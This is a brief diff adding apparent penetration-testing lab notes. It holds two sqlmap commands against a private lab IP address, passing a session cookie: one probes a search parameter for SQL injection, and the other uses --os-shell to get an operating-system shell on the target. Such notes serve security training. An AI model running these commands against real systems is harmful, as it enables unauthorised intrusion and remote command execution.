@@ -1,0 +1,5 @@
+# command to find an sql injection vulnerability when there is security using cookies on a webpage
+sqlmap -u 'http://10.129.70.193/dashboard.php?search=anything' --cookie="858ggvh5mjtb181j0grcb6nd3q"
+
+# perform an sql command injection on the above setup
+sqlmap -u 'http://10.129.70.193/dashboard.php?search=anything' --cookie="858ggvh5mjtb181j0grcb6nd3q" --os-shell
